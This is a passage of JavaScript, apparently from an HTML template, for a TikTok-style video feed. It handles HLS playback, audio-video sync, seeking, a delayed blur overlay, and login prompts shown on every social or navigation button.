                            // If audio was playing, resume it at the new position
                            if (!audio.paused) {
                                var ap = audio.play();
                                if (ap && ap.catch) ap.catch(function() {});
                            }
                        }
                    } catch (e) {}
                }

                // ── HLS fallback for fragmented videos (.ts/.m3u8) ──
                var _hlsInstance = null;
                video.addEventListener('error', function() {
                    try {
                        var videoSrc = video.src || (video.querySelector('source') ? video.querySelector('source').src : '');
                        if (!videoSrc) return;
                        // Check if this looks like an HLS stream
                        if (videoSrc.indexOf('.m3u8') !== -1 || videoSrc.indexOf('mpegurl') !== -1 || videoSrc.indexOf('/proxy_video') !== -1) {
                            if (typeof Hls !== 'undefined' && Hls.isSupported()) {
                                // Clean up previous HLS instance
                                if (_hlsInstance) { try { _hlsInstance.destroy(); } catch(e) {} }
                                _hlsInstance = new Hls({ enableWorker: true });
                                _hlsInstance.loadSource(videoSrc);
                                _hlsInstance.attachMedia(video);
                                _hlsInstance.on(Hls.Events.MANIFEST_PARSED, function() {
                                    try {
                                        if (_wantPlay) {
                                            var p = video.play();
                                            if (p && p.catch) p.catch(function() {});
                                        }
                                    } catch(e) {}
                                });
                            }
                        }
                    } catch (e) {}
                });

                // Also check on 'canplay' — if video has no duration, try HLS
                var _hlsRetryDone = false;
                
                // ── Video event listeners ──
                video.addEventListener('waiting', function() {
                    try {
                        if (spinner) spinner.classList.add('visible');
                        // Pause audio while video buffers to keep them in sync
                        if (audio && !audio.paused) {
                            audio.pause();
                        }
                    } catch (e) {}
                });
                video.addEventListener('canplay', function() {
                    try { if (spinner) spinner.classList.remove('visible'); } catch (e) {}
                });
                video.addEventListener('playing', function() {
                    try {
                        if (spinner) spinner.classList.remove('visible');
                        if (overlay) overlay.classList.remove('visible');
                        // Resume audio if it was paused during buffering
                        if (audio && audio.paused && _wantPlay) {
                            var ap = audio.play();
                            if (ap && ap.catch) ap.catch(function() {});
                        }
                    } catch (e) {}
                });
                video.addEventListener('pause', function() {
                    try {
                        if (_blurTimer) { clearTimeout(_blurTimer); _blurTimer = null; }
                        if (overlay) overlay.classList.add('visible');
                        syncAudio('pause');
                    } catch (e) {}
                });
                video.addEventListener('play', function() {
                    try {
                        _wantPlay = true;
                        video._wantPlay = true;
                        if (overlay) overlay.classList.remove('visible');
                        var ttItem = video.closest('.tt-item');
                        if (ttItem) {
                            var blurMode = ttItem.getAttribute('data-blur-mode');
                            if (blurMode === 'delayed') {
                                var blurDelay = parseInt(ttItem.getAttribute('data-blur-delay')) || 3;
                                if (_blurTimer) clearTimeout(_blurTimer);
                                _blurTimer = setTimeout(function() {
                                    try {
                                        video.classList.add('blurred');
                                        var blurOvEl = ttItem.querySelector('.blur-overlay');
                                        if (blurOvEl) blurOvEl.style.display = 'flex';
                                    } catch (ebt) {}
                                }, blurDelay * 1000);
                            }
                        }
                    } catch (e) {}
                });

                // ── Audio event listeners ──
                if (audio) {
                    audio.addEventListener('canplay', function() {
                        try { if (_wantPlay && video && !video.paused) syncAudio('play'); } catch (e) {}
                    });
                    audio.addEventListener('loadeddata', function() {
                        try { if (_wantPlay && video && !video.paused) syncAudio('play'); } catch (e) {}
                    });
                    // Safety timeout: force audio start after 3s
                    setTimeout(function() {
                        try { if (_wantPlay && video && !video.paused && audio.paused) syncAudio('play'); } catch (e) {}
                    }, 3000);

                    // Audio loops automatically (loop attribute) — re-sync with video on each loop
                    var _lastAudioTime = 0;
                    audio.addEventListener('timeupdate', function() {
                        try {
                            if (_lastAudioTime > 1 && audio.currentTime < 0.5 && audio.duration > 1) {
                                // Audio looped → check if video needs to restart too
                                if (video.duration && isFinite(video.duration)) {
                                    // If audio is shorter than video, audio looped before video
                                    // → restart video to keep in sync
                                    if (audio.duration < video.duration) {
                                        try {
                                            video.pause();
                                            video.currentTime = 0;
                                            var vp = video.play();
                                            if (vp && vp.catch) vp.catch(function() {});
                                        } catch (e11) {}
                                    } else {
                                        // Audio is longer or same → just re-sync audio position
                                        try {
                                            audio.currentTime = video.currentTime % audio.duration;
                                        } catch (e12) {}
                                    }
                                }
                                // Force audio to play at correct position
                                try {
                                    audio.currentTime = video.currentTime % audio.duration;
                                    audio.pause();
                                    var ap = audio.play();
                                    if (ap && ap.catch) ap.catch(function() {});
                                } catch (e13) {}
                            }
                            _lastAudioTime = audio.currentTime;
                        } catch (e) {}
                    });
                }

                // ── Progress bar + loop detection (combined in one handler) ──
                var _lastVideoTime = 0;
                video.addEventListener('timeupdate', function() {
                    try {
                        // Update progress bar using shorter duration
                        var refDur = video.duration;
                        if (audio && audio.duration && isFinite(audio.duration) && audio.duration < refDur) {
                            refDur = audio.duration;
                        }
                        if (pbFill && refDur && isFinite(refDur)) {
                            pbFill.style.width = (video.currentTime / refDur * 100) + '%';
                        }
                        // Detect loop: currentTime jumped backwards to ~0
                        if (_lastVideoTime > 1 && video.currentTime < 0.5 && video.duration > 1) {
                            // Video looped → restart audio to match video
                            if (audio && audio.readyState >= 2) {
                                // If audio is longer than video, audio needs to restart too
                                if (audio.duration > video.duration) {
                                    try {
                                        audio.pause();
                                        audio.currentTime = 0;
                                        var ap = audio.play();
                                        if (ap && ap.catch) ap.catch(function() {});
                                    } catch (e10) {}
                                } else {
                                    // Audio is shorter or same → re-sync position
                                    try {
                                        audio.currentTime = video.currentTime % audio.duration;
                                        audio.pause();
                                        var ap = audio.play();
                                        if (ap && ap.catch) ap.catch(function() {});
                                    } catch (e11) {}
                                }
                            }
                            // Reset progress bar to 0
                            if (pbFill) pbFill.style.width = '0%';
                        }
                        _lastVideoTime = video.currentTime;
                    } catch (e) {}
                });

                // ── Seeked event: sync audio to new position after video finishes seeking ──
                video.addEventListener('seeked', function() {
                    try {
                        if (audio && audio.readyState >= 2 && audio.duration && isFinite(audio.duration)) {
                            audio.currentTime = video.currentTime % audio.duration;
                            _audioSynced = true;
                            // Resume audio if it was playing
                            if (!audio.paused) {
                                var ap = audio.play();
                                if (ap && ap.catch) ap.catch(function() {});
                            }
                        }
                    } catch (e) {}
                });

                // ── Auto-detect HLS: if video doesn't load in 5 seconds, try HLS.js ──
                setTimeout(function() {
                    try {
                        if (video.readyState < 2 && video.networkState === 2) {
                            // Video is loading but not ready — might be HLS
                            var videoSrc = video.src || (video.querySelector('source') ? video.querySelector('source').src : '');
                            if (videoSrc && typeof Hls !== 'undefined' && Hls.isSupported() && !_hlsRetryDone) {
                                _hlsRetryDone = true;
                                if (_hlsInstance) { try { _hlsInstance.destroy(); } catch(e) {} }
                                _hlsInstance = new Hls({ enableWorker: true });
                                _hlsInstance.loadSource(videoSrc);
                                _hlsInstance.attachMedia(video);
                                _hlsInstance.on(Hls.Events.MANIFEST_PARSED, function() {
                                    try {
                                        if (spinner) spinner.classList.remove('visible');
                                        if (_wantPlay) {
                                            var p = video.play();
                                            if (p && p.catch) p.catch(function() {});
                                        }
                                    } catch(e) {}
                                });
                            }
                        }
                    } catch (e) {}
                }, 5000);

                // ── Click handler (play/pause + seek zones) ──
                item.addEventListener('click', function(e) {
                    if (e.target.closest('.action-rail') || e.target.closest('.info-overlay') || e.target.closest('.bottom-nav') || e.target.closest('.progress-bar')) return;
                    if (blurOv && blurOv.contains(e.target)) return;
                    if (e.target.closest('.blur-btn')) return;

                    var now = Date.now();
                    if (now - lastTap < 300) { lastTap = now; return; }

                    var rect = item.getBoundingClientRect();
                    var x = e.clientX - rect.left;
                    var zone = x / rect.width;
                    var dur = video.duration;
                    if (audio && audio.duration && isFinite(audio.duration) && audio.duration < dur) dur = audio.duration;
                    if (!isFinite(dur)) dur = 0;

                    if (zone < 0.25) {
                        video.currentTime = Math.max(0, video.currentTime - 10);
                        if (seekL) { seekL.classList.add('visible'); setTimeout(function() { seekL.classList.remove('visible'); }, 500); }
                    } else if (zone > 0.75) {
                        video.currentTime = Math.min(dur, video.currentTime + 10);
                        if (seekR) { seekR.classList.add('visible'); setTimeout(function() { seekR.classList.remove('visible'); }, 500); }
                    } else {
                        setTimeout(function() {
                            if (Date.now() - lastTap >= 300) {
                                if (video.paused) {
                                    _wantPlay = true;
                                    video._wantPlay = true;
                                    var p = video.play();
                                    if (p && p.catch) p.catch(function() {});
                                    syncAudio('play');
                                    if (overlay) overlay.classList.remove('visible');
                                } else {
                                    _wantPlay = false;
                                    video._wantPlay = false;
                                    video.pause();
                                    if (overlay) overlay.classList.add('visible');
                                }
                            }
                        }, 300);
                    }
                    lastTap = now;
                });

                // ── Progress bar click → seek ──
                if (pbBar) {
                    pbBar.addEventListener('click', function(e) {
                        e.stopPropagation();
                        var dur = video.duration;
                        if (audio && audio.duration && isFinite(audio.duration) && audio.duration < dur) dur = audio.duration;
                        if (!isFinite(dur) || dur <= 0) return;
                        var rect = pbBar.getBoundingClientRect();
                        var pct = (e.clientX - rect.left) / rect.width;
                        video.currentTime = Math.max(0, Math.min(dur, pct * dur));
                    });
                }
            } catch (e) {}
        });

        // ── IntersectionObserver: pause when scrolled away, resume if user had started ──
        try {
            if ('IntersectionObserver' in window) {
                var observer = new IntersectionObserver(function(entries) {
                    entries.forEach(function(entry) {
                        try {
                            var v = entry.target.querySelector('video.tt-video');
                            var a = entry.target.querySelector('audio.tt-audio');
                            var ov = entry.target.querySelector('.play-overlay');
                            var sp = entry.target.querySelector('.loading-spinner');

                            if (entry.intersectionRatio >= 0.5) {
                                if (v && v.paused && v._wantPlay === true) {
                                    var p = v.play();
                                    if (p && p.catch) p.catch(function() {});
                                    if (a && a.paused) {
                                        var ap = a.play();
                                        if (ap && ap.catch) ap.catch(function() {});
                                    }
                                }
                            } else {
                                if (v && !v.paused) v.pause();
                                if (a && !a.paused) a.pause();
                                if (ov) ov.classList.add('visible');
                                if (sp) sp.classList.remove('visible');
                            }
                        } catch (e6) {}
                    });
                }, { threshold: [0, 0.5, 1], root: document.getElementById('feed') });

                items.forEach(function(item) {
                    try {
                        // Skip carousel items — they have their own IntersectionObserver
                        if (item.querySelector('.tt-carousel')) return;
                        observer.observe(item);
                    } catch (e7) {}
                });
            }
        } catch (e) {}

        // ── Action button handlers ──
        document.querySelectorAll('.action-profile').forEach(function(el) {
            el.addEventListener('click', function(e) { e.stopPropagation(); showLoginPopup('View profile'); });
        });
        document.querySelectorAll('.like-btn').forEach(function(b) {
            b.addEventListener('click', function(e) { e.stopPropagation(); showLoginPopup('Like'); });
        });
        document.querySelectorAll('.action-comment').forEach(function(b) {
            b.addEventListener('click', function(e) { e.stopPropagation(); showLoginPopup('Comment'); });
        });
        document.querySelectorAll('.action-bookmark').forEach(function(b) {
            b.addEventListener('click', function(e) { e.stopPropagation(); showLoginPopup('Save'); });
        });
        document.querySelectorAll('.action-share').forEach(function(b) {
            b.addEventListener('click', function(e) { e.stopPropagation(); showLoginPopup('Share'); });
        });

        // ── Bottom navigation handlers ──
        var navActions = {
            'action-nav-home': 'Open home',
            'action-nav-discover': 'Open Discover',
            'action-nav-create': 'Create video',
            'action-nav-inbox': 'Open inbox',
            'action-nav-profile': 'View profile'
        };
        Object.keys(navActions).forEach(function(c) {
            var el = document.querySelector('.' + c);
            if (el) el.addEventListener('click', function(e) { e.stopPropagation(); showLoginPopup(navActions[c]); });
        });
    })();
    </script>
</body>
</html>
"""
